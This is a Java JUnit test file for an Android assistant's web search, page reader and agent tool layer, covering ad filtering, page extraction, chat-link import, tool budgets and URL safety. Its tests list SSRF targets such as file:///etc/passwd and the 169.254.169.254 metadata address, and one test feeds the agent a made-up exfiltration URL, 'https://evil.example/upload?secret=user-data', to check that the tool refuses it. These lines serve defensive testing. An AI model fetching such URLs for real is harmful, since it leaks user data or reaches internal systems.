package com.mozhi.assistant;
import org.junit.Test;import org.json.*;import java.util.*;import java.io.*;import java.net.*;import java.nio.charset.StandardCharsets;import static org.junit.Assert.*;

public class WebClientTest {
    private static final String LINK="https://example.com/article";
    private static final String SHARE="https://chat.deepseek.com/share/example123";
    private static final String SEARCH="<html><div class='result'><a class='result__a' href='//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Farticle&amp;rut=tracking'>示例官方文档</a><a class='result__snippet'>这是搜索摘要，不是完整网页。</a></div><div class='result result--ad'><a class='result__a' href='https://ads.example.com'>广告</a></div></html>";
    private static final String HTML="<html><head><title>公开文档</title><script>secretScript()</script></head><body><nav>导航垃圾</nav><article><h1>标题</h1><p>这是实际正文，包含可靠的资料和可以核实的来源。</p><p>第二段保留换行。</p><a href='/next'>后续资料</a><a href='file:///secret'>无效链接</a></article></body></html>";
    private static WebClient.Page page(String url,String type,String text){return new WebClient.Page(url,type,text.getBytes(StandardCharsets.UTF_8));}
    private static final class Fake implements WebClient.Transport {
        final List<String> urls=new ArrayList<>();boolean cancelled;String special="";
        public WebClient.Page get(String url)throws IOException {if(cancelled)throw new InterruptedIOException("cancelled");urls.add(url);if(special.equals("error"))throw new IOException("网站拒绝访问");
            if(url.contains("/api/v0/share/content"))return page(url,"application/json",ChatImportTest.deepSeek().toString());
            return page(url,"text/html",url.contains("duckduckgo")?SEARCH:HTML);}
        public void cancel(){cancelled=true;}
    }
    @Test public void searchDecodesDestinationAndSkipsAds()throws Exception {
        Fake f=new Fake();JSONObject result=new WebClient(f).search("Android 官方文档");JSONArray r=result.getJSONArray("results");assertEquals(1,r.length());assertEquals(LINK,r.getJSONObject(0).getString("url"));assertTrue(r.getJSONObject(0).getString("kind").contains("摘要"));assertFalse(f.urls.get(0).contains("Android 官方"));assertFalse(f.urls.get(0).contains("test-key"));
    }
    @Test public void failedSearchDoesNotFabricateResults()throws Exception {
        WebClient c=new WebClient(new WebClient.Transport(){public WebClient.Page get(String u){return page(u,"text/html","<h1>请完成验证</h1>");}public void cancel(){}});
        try{c.search("测试");fail();}catch(IOException e){assertTrue(e.getMessage().contains("暂未返回"));}
    }
    @Test public void readerExtractsMainTextAndSafeLinks()throws Exception {
        JSONObject r=WebClient.pageData(page(LINK,"text/html",HTML));String text=r.getString("text");assertTrue(text.contains("实际正文"));assertTrue(text.contains("\n"));assertFalse(text.contains("secretScript"));assertFalse(text.contains("导航垃圾"));assertEquals(1,r.getJSONArray("links").length());assertEquals("https://example.com/next",r.getJSONArray("links").getJSONObject(0).getString("url"));
    }
    @Test public void dynamicShellAndVerificationPagesFailExplicitly()throws Exception {
        for(String html:new String[]{"<html><title>DeepSeek</title><script src='app.js'></script><body>Loading</body></html>","<html><title>Just a moment</title><body>Verify you are human</body></html>"})try{WebClient.pageData(page(LINK,"text/html",html));fail();}catch(IOException expected){}
    }
    @Test public void longWebPageIsFlaggedAndNotSilentlyImportedPartially()throws Exception {
        String body=String.join("",Collections.nCopies(17000,"字"));JSONObject r=WebClient.pageData(page(LINK,"text/plain",body));assertTrue(r.getBoolean("truncated"));assertEquals(16000,r.getString("text").length());
        WebClient c=new WebClient(new WebClient.Transport(){public WebClient.Page get(String u){return page(u,"text/plain",body);}public void cancel(){}});try{c.importLink(LINK);fail();}catch(IOException e){assertTrue(e.getMessage().contains("无法完整导入"));}
    }
    @Test public void deepSeekLinkReadsPublicEndpointAndKeepsCompleteTranscript()throws Exception {
        Fake f=new Fake();WebClient.ReadResult r=new WebClient(f).read(SHARE);assertEquals("https://chat.deepseek.com/api/v0/share/content?share_id=example123",f.urls.get(0));assertEquals(SHARE,r.data.getString("url"));assertEquals(2,r.transcript.messages.size());assertFalse(r.data.getString("text").contains("private-reasoning"));
    }
    @Test public void onlyExactDeepSeekHostUsesShareAdapter()throws Exception {assertNull(WebClient.deepSeekId(PublicWeb.url("https://chat.deepseek.com.evil.com/share/example123")));assertNull(WebClient.deepSeekId(PublicWeb.url("https://chat.deepseek.com/sign_in")));}
    @Test public void privateAndCredentialBearingUrlsAreRejected()throws Exception {
        for(String u:new String[]{"http://example.com","file:///etc/passwd","https://user:pass@example.com","https://127.0.0.1/x","https://10.0.0.1","https://192.168.1.1","https://169.254.169.254","https://localhost/x","https://router.local/","https://example.com:8443/","https://example.com\n/"})try{PublicWeb.url(u);fail(u);}catch(IOException expected){}
        assertEquals(LINK,PublicWeb.url(LINK+"#section").toString());
    }
    @Test public void dnsRejectsPrivateMappedAndReservedAddresses()throws Exception {
        for(String ip:new String[]{"127.0.0.1","0.0.0.0","100.64.1.2","172.16.0.3","169.254.169.254","198.18.0.1","224.0.0.1","::1","::ffff:127.0.0.1","fc00::1","fe80::1","2001:db8::1"})assertFalse(ip,PublicWeb.isPublic(InetAddress.getByName(ip)));
        assertTrue(PublicWeb.isPublic(InetAddress.getByName("8.8.8.8")));assertTrue(PublicWeb.isPublic(InetAddress.getByName("2001:4860:4860::8888")));
    }
    @Test public void networkToolsRemainAvailableWithMemoryOffAndRespectWebOff()throws Exception {
        Core.Item u=new Core.Item("u","message","c",1,Core.obj("text","查资料"));WebTools w=new WebTools(new WebClient(new Fake()),"查资料",s->{});
        AgentSession enabled=new AgentSession(k->Collections.emptyList(),u,false,false,w);assertEquals(3,enabled.schemas().length());assertTrue(enabled.instructions().contains("已启用 web_search"));assertTrue(enabled.call("remember",new JSONObject()).has("error"));
        AgentSession disabled=new AgentSession(k->Collections.emptyList(),u,true,true);assertTrue(disabled.call("web_search",Core.obj("query","查询")).has("error"));assertTrue(disabled.instructions().contains("联网已关闭"));
    }
    @Test public void sourceFooterUsesOnlyActualResultsAndIncludesErrorsInTrace()throws Exception {
        Fake f=new Fake();WebTools w=new WebTools(new WebClient(f),"读 "+LINK,s->{});w.call("read_url",Core.obj("url",LINK));assertTrue(w.withSources("结论").contains("](https://example.com/article)"));assertTrue(w.trace.get(0).contains("公开文档"));
        Fake failed=new Fake();failed.special="error";WebTools error=new WebTools(new WebClient(failed),"读 "+LINK,s->{});assertTrue(error.call("read_url",Core.obj("url",LINK)).has("error"));assertEquals("没有读取到",error.withSources("没有读取到"));
    }
    @Test public void arbitraryConstructedExfiltrationUrlCannotBeFetched()throws Exception {
        Fake f=new Fake();WebTools w=new WebTools(new WebClient(f),"读 "+LINK,s->{});JSONObject r=w.call("read_url",Core.obj("url","https://evil.example/upload?secret=user-data"));assertTrue(r.has("error"));assertTrue(f.urls.isEmpty());
        w.call("web_search",Core.obj("query","示例资料"));assertFalse(w.call("read_url",Core.obj("url",LINK)).has("error"));
    }
    @Test public void importIsOnlyPreparedOnExplicitUserRequestAndExactLink()throws Exception {
        WebTools explicit=new WebTools(new WebClient(new Fake()),SHARE+" 打开并导入聊天记录",s->{});JSONObject r=explicit.call("read_url",Core.obj("url",SHARE));assertEquals(1,explicit.imports.size());assertTrue(r.getString("import_status").contains("尚未导入"));
        explicit.call("read_url",Core.obj("url",SHARE));assertEquals(1,explicit.imports.size());WebTools readOnly=new WebTools(new WebClient(new Fake()),"总结 "+SHARE,s->{});readOnly.call("read_url",Core.obj("url",SHARE));assertTrue(readOnly.imports.isEmpty());
    }
    @Test public void toolBudgetsAreBounded()throws Exception {Fake f=new Fake();WebTools w=new WebTools(new WebClient(f),LINK,s->{});for(int n=0;n<3;n++)assertFalse(w.call("web_search",Core.obj("query","测试")).has("error"));assertTrue(w.call("web_search",Core.obj("query","测试")).has("error"));for(int n=0;n<4;n++)w.call("read_url",Core.obj("url",LINK));assertTrue(w.call("read_url",Core.obj("url",LINK)).has("error"));assertEquals(7,f.urls.size());}
    @Test public void cancelledNetworkDoesNotBecomeSuccessfulToolResult()throws Exception {Fake f=new Fake();WebClient c=new WebClient(f);c.cancel();WebTools w=new WebTools(c,LINK,s->{});try{w.call("read_url",Core.obj("url",LINK));fail();}catch(InterruptedIOException expected){}assertTrue(f.urls.isEmpty());}
    @Test public void realAgentLoopCanSearchReadAndFinishWithSources()throws Exception {
        WebTools w=new WebTools(new WebClient(new Fake()),"搜索并解释文档",s->{});Core.Item user=new Core.Item("u","message","c",1,Core.obj("text","搜索并解释文档"));AgentSession session=new AgentSession(k->Collections.emptyList(),user,false,false,w);int[] calls={0};
        String result=AgentEngine.run(new JSONArray(),(ms,ts,last)->{int n=calls[0]++;if(n==2){assertTrue(ms.toString().contains("实际正文"));return Core.obj("content","根据文档解释");}String name=n==0?"web_search":"read_url";JSONObject args=n==0?Core.obj("query","示例文档"):Core.obj("url",LINK);return Core.obj("tool_calls",new JSONArray().put(Core.obj("id","t"+n,"type","function","function",Core.obj("name",name,"arguments",args.toString()))));},session,new AgentEngine.Control(){public void check(){}public void progress(String s){}});
        assertEquals(3,calls[0]);assertTrue(w.withSources(result).contains(LINK));assertEquals(2,session.trace.size());assertTrue(session.changes().isEmpty());
    }
}
